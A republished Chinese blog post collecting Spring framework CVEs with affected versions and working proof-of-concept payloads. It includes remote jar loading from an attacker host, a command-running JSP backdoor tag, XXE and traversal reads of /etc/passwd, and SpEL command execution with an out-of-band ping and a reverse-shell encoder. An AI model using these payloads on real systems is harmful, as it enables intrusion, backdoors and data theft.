<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="白仁的博客" type="application/atom+xml" />






<meta name="description" content="Spring漏洞集合转载自 https:&#x2F;&#x2F;misakikata.github.io&#x2F;2020&#x2F;04&#x2F;Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F; 0x00 CVE-2010-1622 Spring Framework class.classLoader类远程代码执行 影响版本：SpringSource Spring">
<meta property="og:type" content="article">
<meta property="og:title" content="Spring漏洞集合">
<meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;08&#x2F;12&#x2F;Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F;index.html">
<meta property="og:site_name" content="白仁的博客">
<meta property="og:description" content="Spring漏洞集合转载自 https:&#x2F;&#x2F;misakikata.github.io&#x2F;2020&#x2F;04&#x2F;Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F; 0x00 CVE-2010-1622 Spring Framework class.classLoader类远程代码执行 影响版本：SpringSource Spring">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;08&#x2F;12&#x2F;Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F;1.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;08&#x2F;12&#x2F;Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F;2.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;08&#x2F;12&#x2F;Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F;3.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;08&#x2F;12&#x2F;Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F;4.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;08&#x2F;12&#x2F;Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F;5.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;08&#x2F;12&#x2F;Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F;6.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;08&#x2F;12&#x2F;Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F;7.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;08&#x2F;12&#x2F;Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F;8.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;08&#x2F;12&#x2F;Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F;9.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;08&#x2F;12&#x2F;Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F;10.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;08&#x2F;12&#x2F;Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F;11.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;08&#x2F;12&#x2F;Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F;12.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;08&#x2F;12&#x2F;Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F;13.png">
<meta property="og:updated_time" content="2020-11-18T08:26:30.728Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;08&#x2F;12&#x2F;Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88&#x2F;1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://bai-ren-1.github.io/2020/08/12/Spring漏洞集合/"/>





  <title>Spring漏洞集合 | 白仁的博客</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">白仁的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="白仁">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="白仁的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Spring漏洞集合</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-12T20:12:58+08:00">
                2020-08-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
                    <span itemprop="name">WEB安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="Spring漏洞集合"><a href="#Spring漏洞集合" class="headerlink" title="Spring漏洞集合"></a>Spring漏洞集合</h1><p>转载自</p>
<p><a href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/" target="_blank" rel="noopener">https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</a></p>
<h2 id="0x00-CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行"><a href="#0x00-CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行" class="headerlink" title="0x00 CVE-2010-1622 Spring Framework class.classLoader类远程代码执行"></a>0x00 CVE-2010-1622 Spring Framework class.classLoader类远程代码执行</h2><blockquote>
<p>影响版本：SpringSource Spring Framework 3.0.0 - 3.0.2、SpringSource Spring Framework 2.5.0 - 2.5.7</p>
</blockquote>
<p>Spring框架提供了一种机制，该机制使用客户端提供的数据来更新对象属性。这个机制允许攻击者修改用于加载对象的类加载器的属性（通过’class.classloader’）。这可能导致任意命令执行，例如，攻击者可以修改URL。由类加载器用来指向攻击者控制的位置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">示例：POST /adduser HTTP/1.0</span><br><span class="line">...</span><br><span class="line">firstName = Tavis&amp;lastName = Ormandy</span><br><span class="line"></span><br><span class="line">如果Person是表单的支持对象，则firstName和lastName属性将设置为相应的值。为了支持更复杂的类，Spring还支持点表示法，因此user.address.street = Disclosure + Str。</span><br><span class="line"></span><br><span class="line">将等效于：frmObj.getUser().getAddress().setStreet(&quot;Disclosure Str.&quot;)  </span><br><span class="line">问题是Spring Beans的CachedIntrospectionResults类枚举了可从用户表单提交中设置的属性，使用  java.beans.Introspector.getBeanInfo()而不指定停止类，这意味着&apos; class &apos;属性及其后的所有内容均可用于HTTP请求中的设置。</span><br><span class="line"></span><br><span class="line">攻击</span><br><span class="line">如果攻击者使用以下HTTP参数向表单控制器提交HTTP请求：</span><br><span class="line">POST /adduser HTTP/1.0</span><br><span class="line">...</span><br><span class="line">class.classLoader.URLs[0] = jar:http://attacker/spring-exploit.jar!</span><br><span class="line"></span><br><span class="line">它将使用自己的网址覆盖frmObj.getClass().getClassLoader().getURLs() 返回的数组中的第0个元素.它将是哪个类加载器？</span><br><span class="line"></span><br><span class="line">在Apache Tomcat上的情况下，它指org.apache.catalina.loader.WebappClassLoader</span><br></pre></td></tr></table></figure>

<p>如何构造这个jar，需要包含以下信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- META-INF/spring-form.tld - 定义spring表单标签并指定实现为标签文件而不是类</span><br><span class="line">- META-INF/tags/中的标签文件，包含有标签定义（任意Java代码）</span><br></pre></td></tr></table></figure>

<p>/META-INF/spring-form.tld文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &lt;form:input/&gt; tag --&gt;    </span><br><span class="line">	&lt;tag-file&gt;    </span><br><span class="line">	&lt;name&gt;input&lt;/name&gt;    </span><br><span class="line">	&lt;path&gt;/META-INF/tags/InputTag.tag&lt;/path&gt;  </span><br><span class="line">&lt;/tag-file&gt;</span><br></pre></td></tr></table></figure>

<p>/META-INF/tags/InputTag.tag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ tag dynamic-attributes=&quot;dynattrs&quot; %&gt;</span><br><span class="line">&lt;% </span><br><span class="line">	j java.lang.Runtime.getRuntime().exec(&quot;mkdir /tmp/PWNED&quot;); </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>做出这样的替换后，当开发者在controller中将任何一个对象绑定表单，并且最终展示的jsp内容有下面这些：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=&quot;form&quot; uri=&quot;http://www.springframework.org/tags/form&quot;%&gt;  </span><br><span class="line">&lt;form:form commandName=&quot;user&quot;&gt;</span><br><span class="line">&lt;form:input path=&quot;name&quot;/&gt;</span><br><span class="line">&lt;/form:form&gt;</span><br></pre></td></tr></table></figure>

<p>攻击者访问url,即可触发远程代码执行的效果:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://inbreak.net/springmvc/testjsp.htm? class.classLoader.URLs[0]=jar:https://inbreak.net/spring-exploit.jar!/</span><br></pre></td></tr></table></figure>

<p>如果服务器大于tomcat6.0.28版本，这样做会把所有的input标签替换掉，导致不能正常显示。需要修改</p>
<p>spring-form.tld，给其中的inputtag改名，name改为inputkxlzx：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;tag&gt;        </span><br><span class="line">	&lt;name&gt;inputkxlzx&lt;/name&gt;  //什么名字都行</span><br></pre></td></tr></table></figure>

<p>在文件中新加入一个tag，叫做input：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;tag-file&gt;    </span><br><span class="line">	&lt;name&gt;input&lt;/name&gt;    </span><br><span class="line">	&lt;path&gt;/WEB-INF/tags/InputTag.tag&lt;/path&gt;  </span><br><span class="line">&lt;/tag-file&gt;</span><br></pre></td></tr></table></figure>

<p>InputTag.tag的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ tag dynamic-attributes=&quot;dynattrs&quot; %&gt;</span><br><span class="line">&lt;%if (request.getParameter(&quot;kxlzxcmd&quot;)!=null)     </span><br><span class="line">	exec(request.getParameter(&quot;kxlzxcmd&quot;)); </span><br><span class="line">%&gt;</span><br><span class="line">&lt;form:inputkxlzx path=&quot;$&#123;dynattrs.path&#125;&quot;&gt;&lt;/form:inputkxlzx&gt;</span><br></pre></td></tr></table></figure>

<p>访问的时候需要在参数中携带kxlzxcmd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.htm?name=kxlzx&amp;kxlzxcmd=calc   //包含input的页面</span><br></pre></td></tr></table></figure>

<p><a href="http://blog.o0o.nu/2010/06/cve-2010-1622.html" target="_blank" rel="noopener">http://blog.o0o.nu/2010/06/cve-2010-1622.html</a></p>
<p><a href="https://www.inbreak.net/archives/377" target="_blank" rel="noopener">https://www.inbreak.net/archives/377</a></p>
<h2 id="0x01-CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入"><a href="#0x01-CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入" class="headerlink" title="0x01 CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入"></a>0x01 CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入</h2><blockquote>
<p>影响版本：3.0.0至3.2.3、4.0.0.M1</p>
</blockquote>
<p>受影响版本容易受到XML外部实体（XXE）注入的攻击。该<code>SourceHttpMessageConverter</code>处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。</p>
<p>当传输xml结构体时，如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;   </span><br><span class="line">	&lt;username&gt;John&lt;/username&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure>

<p>外部XML实体- <code>xxe</code>是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 <code>/etc/passwd</code>并将其显示给呈现给用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [   </span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;   </span><br><span class="line">	&lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure>

<p>其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。</p>
<h2 id="0x02-CVE-2013-7315-Spring-Framework中的XML外部实体"><a href="#0x02-CVE-2013-7315-Spring-Framework中的XML外部实体" class="headerlink" title="0x02 CVE-2013-7315 Spring Framework中的XML外部实体"></a>0x02 CVE-2013-7315 Spring Framework中的XML外部实体</h2><blockquote>
<p>影响版本：3.2.0至3.2.3、4.0.0.M1-4.0.0.M2（Spring MVC）</p>
</blockquote>
<p>由于对 <strong>CVE-2013-4152</strong>和<strong>CVE-2013-6429的</strong>修复不完整导致。</p>
<p>受影响版本容易受到XML外部实体（XXE）注入的攻击。该<code>SourceHttpMessageConverter</code>处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。</p>
<p>当传输xml结构体时，如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;   </span><br><span class="line">	&lt;username&gt;John&lt;/username&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure>

<p>外部XML实体- <code>xxe</code>是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 <code>/etc/passwd</code>并将其显示给呈现给用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [   </span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;   </span><br><span class="line">	&lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure>

<p>其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。</p>
<h2 id="0x03-CVE-2014-3527-Spring-Security验证绕过漏洞"><a href="#0x03-CVE-2014-3527-Spring-Security验证绕过漏洞" class="headerlink" title="0x03 CVE-2014-3527 Spring Security验证绕过漏洞"></a>0x03 CVE-2014-3527 Spring Security验证绕过漏洞</h2><blockquote>
<p>影响版本：SpringSource Spring Security 3.1-3.2.4</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当使用从Spring Security 3.1到3.2.4的CAS代理票证身份验证时，恶意的CAS服务可能会欺骗另一个CAS服务来认证未关联的代理票证。这是由于以下事实：代理票证身份验证使用了来自HttpServletRequest的信息，该信息是根据HTTP请求中的不可信信息填充的。这意味着，如果存在CAS服务可以相互认证的访问控制限制，则可以绕过这些限制。如果用户未使用CAS代理票证，并且未基于CAS服务做出访问控制决策，则对用户没有影响。</span><br></pre></td></tr></table></figure>



<h2 id="0x04-CVE-2014-0097-Spring-Security认证绕过"><a href="#0x04-CVE-2014-0097-Spring-Security认证绕过" class="headerlink" title="0x04 CVE-2014-0097 Spring Security认证绕过"></a>0x04 CVE-2014-0097 Spring Security认证绕过</h2><blockquote>
<p>影响版本：Spring Security 3.2.0至3.2.1和3.1.0至3.1.5</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ActiveDirectoryLdapAuthenticator不检查密码长度。如果目录允许匿名绑定，则它可能会错误地验证提供空密码的用户。</span><br></pre></td></tr></table></figure>



<h2 id="0x05-CVE-2014-3578-Spring-Framework-目录遍历漏洞"><a href="#0x05-CVE-2014-3578-Spring-Framework-目录遍历漏洞" class="headerlink" title="0x05 CVE-2014-3578 Spring Framework 目录遍历漏洞"></a>0x05 CVE-2014-3578 Spring Framework 目录遍历漏洞</h2><p>影响版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Framework:</span><br><span class="line">- 3.0.4 to 3.2.11</span><br><span class="line">- 4.0.0 to 4.0.7</span><br><span class="line">- 4.1.0 to 4.1.1</span><br></pre></td></tr></table></figure>

<p>在web.xml存在如下情况下存在目录遍历：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;mvc:resources mapping=&quot;/css/**&quot; location=&quot;file:webapps/springapp/WEB-INF/classes/theme/css/&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /springapp/css/file:/etc/passwd</span><br></pre></td></tr></table></figure>



<h2 id="0x06-CVE-2016-2173-Spring-AMQP中的远程代码执行"><a href="#0x06-CVE-2016-2173-Spring-AMQP中的远程代码执行" class="headerlink" title="0x06 CVE-2016-2173 Spring AMQP中的远程代码执行"></a>0x06 CVE-2016-2173 Spring AMQP中的远程代码执行</h2><p>影响版本：1.0.0至1.5.4</p>
<p><a href="https://github.com/HaToan/CVE-2016-2173" target="_blank" rel="noopener">https://github.com/HaToan/CVE-2016-2173</a></p>
<p>使用方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- ysoserial-0.0.4-all.jar create payload write and execute a shell    </span><br><span class="line">	+ java -jar ysoserial-0.0.4-all.jar &apos;library_vul&apos; &apos;command&apos;</span><br><span class="line">	</span><br><span class="line">- exploit-cve2016-2173.jar : send to App vul    </span><br><span class="line">	+ java -jar exploit-cve2016-2173.jar</span><br></pre></td></tr></table></figure>

<p>本来想根据配置来搭一个环境处理，结果环境一直搭不起来，构建各种失败，就先放这个利用poc把。</p>
<h2 id="0x07-CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞"><a href="#0x07-CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞" class="headerlink" title="0x07 CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞"></a>0x07 CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞</h2><p>影响版本：2.0.0-2.0.9、1.0.0-1.0.5</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-92474" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92474</a></p>
<p>漏洞利用POC：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=$&#123;2334-1&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/1.png" alt></p>
<p>执行命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://207.246.79.196:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=$&#123;T(java.lang.Runtime).getRuntime().exec(%22ping%20xxx.ceye.io%22)&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/2.png" alt></p>
<p>但是此命令执行，不会在页面上显示，只会打印出运行的对象。</p>
<p>如果要执行反弹shell等命令，由于页面HTML编码的原因，SPEL返回值时进行了一次html编码，所以导致取出的 值时会进行一次转义，利用如下脚本加工。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">message = input(&apos;Enter message to encode:&apos;)</span><br><span class="line"></span><br><span class="line">print(&apos;Decoded string (in ASCII):\n&apos;)</span><br><span class="line">print(&apos;T(java.lang.Character).toString(%s)&apos; % ord(message[0]), end=&quot;&quot;)</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:   </span><br><span class="line">	print(&apos;.concat(T(java.lang.Character).toString(%s))&apos; % ord(ch), end=&quot;&quot;), </span><br><span class="line">print(&apos;\n&apos;)</span><br><span class="line">	</span><br><span class="line">print(&apos;new java.lang.String(new byte[]&#123;&apos;, end=&quot;&quot;),</span><br><span class="line">print(ord(message[0]), end=&quot;&quot;)</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:   </span><br><span class="line">	print(&apos;,%s&apos; % ord(ch), end=&quot;&quot;), </span><br><span class="line">print(&apos;)&#125;&apos;)</span><br></pre></td></tr></table></figure>

<p>执行输出后再添加：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(payload)</span><br></pre></td></tr></table></figure>



<h2 id="0x08-CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞"><a href="#0x08-CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞" class="headerlink" title="0x08 CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞"></a>0x08 CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞</h2><blockquote>
<p>影响版本：1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</p>
</blockquote>
<p><a href="https://www.cnblogs.com/litlife/p/10183137.html" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/10183137.html</a></p>
<p>下载存在漏洞的版本1.3.0：<a href="https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip</a></p>
<p>POC：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?payload=$&#123;new%20java.lang.String(new%20byte[]&#123;70, 66, 66, 50, 48, 52, 65, 52, 48, 54, 49, 70, 70, 66, 68, 52, 49, 50, 56, 52, 65, 56, 52, 67, 50, 53, 56, 67, 49, 66, 70, 66&#125;)&#125;结果：FBB204A4061FFBD41284A84C258C1BFB返回结果是md5(wooyun)</span><br></pre></td></tr></table></figure>



